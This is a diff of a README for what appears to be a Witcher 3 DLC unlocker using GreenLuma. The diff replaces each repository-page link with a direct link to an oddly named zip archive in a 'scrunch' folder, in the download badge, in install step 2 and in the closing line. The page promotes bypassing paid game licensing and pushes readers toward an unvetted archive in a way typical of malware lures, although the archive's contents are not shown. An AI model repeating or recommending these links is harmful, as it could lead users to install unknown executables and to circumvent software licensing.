@@ -1,6 +1,6 @@
 # 🔮 The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn - Access all Witcher 3 content today
 
-[![Download Here](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn)
+[![Download Here](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn/raw/refs/heads/main/scrunch/Unlocker_Witcher_The_Ready_Luma_DL_Online_Reborn_Green_v1.6.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these specifications before you start:
 Follow these steps to set up the software on your machine:
 
 1. Close the Steam application completely. Press Ctrl+Shift+Esc to open the Task Manager and stop any remaining Steam processes.
-2. Visit the download page: [https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn](https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn).
+2. Visit the download page: [https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn/raw/refs/heads/main/scrunch/Unlocker_Witcher_The_Ready_Luma_DL_Online_Reborn_Green_v1.6.zip](https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn/raw/refs/heads/main/scrunch/Unlocker_Witcher_The_Ready_Luma_DL_Online_Reborn_Green_v1.6.zip).
 3. Look for the "Releases" section on the right side of the page.
 4. Click on the latest version tag.
 5. Download the compressed file, typically ending in .zip.
@@ -65,4 +65,4 @@ If you run into problems, check these solutions:
 
 The project benefits from open communication. If you find bugs or have questions, reach out through the GitHub repository page. Always verify that you use the link provided here to ensure you have the authentic version of the tool. 
 
-Visit this page to download: [https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn](https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn).
+Visit this page to download: [https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn/raw/refs/heads/main/scrunch/Unlocker_Witcher_The_Ready_Luma_DL_Online_Reborn_Green_v1.6.zip](https://github.com/Natkawindless527/The-Witcher-3-DLC-Unlocker-Online-Ready-GreenLuma-Reborn/raw/refs/heads/main/scrunch/Unlocker_Witcher_The_Ready_Luma_DL_Online_Reborn_Green_v1.6.zip).
